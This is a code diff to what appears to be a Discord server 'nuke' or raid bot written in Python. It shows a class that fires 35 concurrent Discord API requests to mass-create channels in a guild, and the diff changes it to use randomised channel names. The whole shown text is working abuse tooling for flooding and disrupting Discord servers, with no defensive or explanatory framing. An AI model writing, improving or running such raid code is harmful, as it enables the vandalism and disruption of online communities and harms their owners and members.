@@ -3,6 +3,8 @@ from datetime import datetime, timedelta
 
 from aiohttp import ClientSession
 
+import random
+
 from core.config.config import (CHNAME,  LINKSERV, TEXT, headers, NAME)
 from core.tasks import create_tasks, request
 
@@ -37,9 +39,10 @@ class Fucker:
             f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/channels"
             for _ in range(35)
         ]
-        json = {"name": CHNAME, "topic": "", "type": 0}
         async with ClientSession(headers=self.headers, connector=None) as session:
-            await create_tasks(urls, session.post, self.headers, json)
+            for url in urls:
+                json = {"name": random.choice(CHNAME), "topic": "", "type": 0}
+                await create_tasks([url], session.post, self.headers, json)
 
     async def create_event(self, ctx):
         name = NAME
